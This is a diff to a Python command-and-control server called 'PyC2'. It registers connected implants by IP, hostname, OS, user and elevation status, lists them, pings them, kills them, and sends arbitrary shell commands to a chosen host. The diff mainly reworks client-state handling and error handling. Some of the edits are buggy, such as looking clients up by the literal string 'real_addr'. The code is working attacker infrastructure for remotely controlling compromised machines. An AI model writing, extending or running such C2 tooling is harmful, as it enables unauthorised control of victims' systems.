@@ -2,7 +2,7 @@ import socket
 import threading
 import time
 import ipaddress    
-import copy
+#import copy
 
 HOST='localhost'
 LISTEN_PORT=9999
@@ -40,7 +40,7 @@ client_info ={
 """
 
 clients_info = {}
-clients_dead_info = {}
+#clients_dead_info = {}
 clients_lock = threading.Lock()
 
 class style():
@@ -61,40 +61,52 @@ def main():
     handle_connect_thread = threading.Thread(target=handle_connections, args=(server_sock,), daemon=True)
     handle_connect_thread.start()
 
+    for line in [f"\n\t************************************************",f"\t********************{style.GREEN} PyC2 {style.RESET}********************","\t************************************************"]:
+        print(line)
+
     while True:
         command_menu()
 
-def print_pretty(clients_alive,clients_dead,show_dead=True):
-    sorted_dict = dict(sorted(clients_alive.items(), key=lambda item: ipaddress.IPv4Address(item[0])))
-    for nested in sorted_dict.values():
-        nested["alive"] = True
-    copy_dead = copy.deepcopy(clients_dead)
-    for nested in copy_dead.values():
-        nested["alive"] = False
+def print_pretty(show_dead=True):
+    global clients_info
+    with clients_lock:
+        sorted_dict = dict(sorted(clients_info.items(), key=lambda item: ipaddress.IPv4Address(item[0])))
+        '''
+        for nested in sorted_dict.values():
+            nested["alive"] = True
+        copy_dead = copy.deepcopy(clients_info)
+        for nested in copy_dead.values():
+            nested["alive"] = False
 
-    sorted_dict.update(copy_dead)
-    sorted_dict = dict(sorted(sorted_dict.items(), key=lambda item: ipaddress.ip_address(item[0])))
-    for client in sorted_dict.values():
-        if client["alive"]:
-            status_color = style.GREEN
+        sorted_dict.update(copy_dead)
+        sorted_dict = dict(sorted(sorted_dict.items(), key=lambda item: ipaddress.ip_address(item[0])))
+        '''
+        if len(sorted_dict) == 0:
+            print(f"{style.RED}Clients database is empty{style.RESET}")
         else:
-            status_color = style.RED
-        print(f"{status_color}{client.values()}{style.RESET}")
+            print(f"{style.BLUE}{'IP Address':<15} | {'Hostname':<25} | {'OS':<12} | {'Current User':<15} | {'Is Elevated':<11}{style.RESET}")
+            for client in sorted_dict.values():
+                if client["alive"]:
+                    status_color = style.GREEN
+                else:
+                    status_color = style.RED
+                    if not show_dead:
+                        continue
+                print(f"{status_color}{client['ipaddr']:<15} | {client['hostname']:<25} | {client['sys_os']:<12} | {client['cur_user']:<15} | {client['elevated']:<11}{style.RESET}")
 
 def command_menu():
     global clients_info
 
-    for line in [f"\n\t************************************************",f"\t***************{style.GREEN} Shortcut Creator {style.RESET}***************","\t************************************************"]:
-        print(line)
-    print("\n\nEnter Selection:\n")
+    #for line in [f"\n\t************************************************",f"\t********************{style.GREEN} PyC2 {style.RESET}********************","\t************************************************"]:
+    #    print(line)
+    print("\nEnter Selection:")
     for line in ["1 - List connected clients","2 - Ping Check","3 - Kill a client","4 - Send Command","5 - Exit"]: #,"4 - Exit"
         print("\t"+line)
-    print("") # extra blank line
 
-    response = input(f"Please enter a number").strip()
+    response = input(f"Please enter a number: ").strip()
     if response == "1": # List
-        with clients_lock:
-            print_pretty(clients_info,clients_dead_info,True)
+        #with clients_lock: # used inside func
+        print_pretty(True)
 
     elif response == "2": # Ping check
         ping_all(True)
@@ -102,16 +114,30 @@ def command_menu():
     elif response == "3": # Kill by IP
         client_ipaddr = input("Client IP to kill: ").strip()
         with clients_lock:
-            client = clients_info[client_ipaddr]
-            client["cs"].send(b"KILL")
-            # TODO close?
+            try:
+                client = clients_info[client_ipaddr]
+                client_ip = client["ipaddr"]
+                try:
+                    client["cs"].send(b"KILL")
+                    client["cs"].close()
+                except:
+                    pass
+                finally:
+                    #clients_dead_info[client_ip] = clients_info.pop(client_ip)
+                    client["alive"] = False
+                    client["cs"] = None
+            except KeyError:
+                print(f"Client {client_ipaddr} not found.")
 
     elif response == "4": # Command by IP
         client_ipaddr = input("Client IP to command: ").strip()
         client_cmd = input("Command: ").strip()
         with clients_lock:
-            client = clients_info[client_ipaddr]
-            client["cs"].send(f"CMD {client_cmd}".encode())
+            try:
+                client = clients_info[client_ipaddr]
+                client["cs"].send(f"CMD {client_cmd}".encode())
+            except KeyError:
+                print(f"Client {client_ipaddr} not found.")
 
     elif response == "5": # Exit
         confirm = input("Are you sure you want to exit? This will kill the server. Type y/n: ").strip()
@@ -123,7 +149,7 @@ def ping_all(noisy=False):
     threads = []
 
     with clients_lock:
-        clients_snapshot = list(clients_info)  # make a copy to safely iterate
+        clients_snapshot = list(clients_info)  # make a copy to safely iterate. TODO this is so wrong
 
     for client in clients_snapshot:
         thread = threading.Thread(target=ping_client, args=(client, noisy))
@@ -150,7 +176,12 @@ def ping_client(client, noisy=False):
             print(f"Client {ip} is dead: {e}")
         with clients_lock:
             if client in clients_info:
-                clients_dead_info[ip] = clients_info.pop(ip)
+                #clients_dead_info[ip] = clients_info.pop(ip)
+                try:
+                    client["cs"].close()
+                finally:
+                    client["alive"] = False
+                    client["cs"] = None
 
 '''
 Listens for incoming client connections and attempts to process them.
@@ -163,7 +194,10 @@ def handle_connections(server_sock):
 
     # Await connections
     while True:
-        client_sock,addr = server_sock.accept()
+        try:
+            client_sock,addr = server_sock.accept()
+        except TimeoutError:
+            continue
         client_sock.settimeout(TIMEOUT_TIME)
         print(f"Got new connection from {addr}")
 
@@ -179,7 +213,7 @@ def handle_connections(server_sock):
             # "REG {ipaddress} | {hostname} | {sys_os} | {cur_user} | {elevated}"
             data = received_msg[len("REG "):]
             parts = [part.strip() for part in data.split('|')]
-            print(f"Client resolves to {data[0]}")
+            print(f"Client resolves to {parts[0]}")
 
             if len(parts) != 5:
                 print(f"Malformed REG message from {addr}: {received_msg}")
@@ -195,7 +229,8 @@ def handle_connections(server_sock):
                 "cur_user" : parts[3],
                 "elevated" : parts[4],
                 "cs" : client_sock,
-                "thrd" : thread
+                "thrd" : thread,
+                "alive" : True
             }
 
             with clients_lock:
@@ -218,16 +253,27 @@ def handle_client(client_sock,addr,real_addr): #real addr is a new copy so dont 
 
     while True:
         try:
-            received_msg = client_sock.recv(BUFFER_SIZE).decode()
+            received_msg = client_sock.recv(BUFFER_SIZE).decode() # TODO sending kill makes this error 10038 an operation was attempted on something that is not a socket
         except ConnectionResetError:
             print(f"Client {real_addr} lost connection")
             with clients_lock:
-                clients_dead_info[real_addr] = clients_info.pop(real_addr)
-            client_sock.close()
+                #clients_dead_info[real_addr] = clients_info.pop(real_addr)
+                client = clients_info["real_addr"]
+                try:
+                    client["cs"].close()
+                finally:
+                    client["alive"] = False
+                    client["cs"] = None
             break
         if received_msg.startswith("KILL_R"):
             print(f"Client {real_addr} is exiting with status {received_msg[len("KILL_R "):]}")
             with clients_lock:
-                clients_dead_info[real_addr] = clients_info.pop(real_addr)
+                #clients_dead_info[real_addr] = clients_info.pop(real_addr)
+                client = clients_info["real_addr"]
+                try:
+                    client["cs"].close()
+                finally:
+                    client["alive"] = False
+                    client["cs"] = None
 
 main()
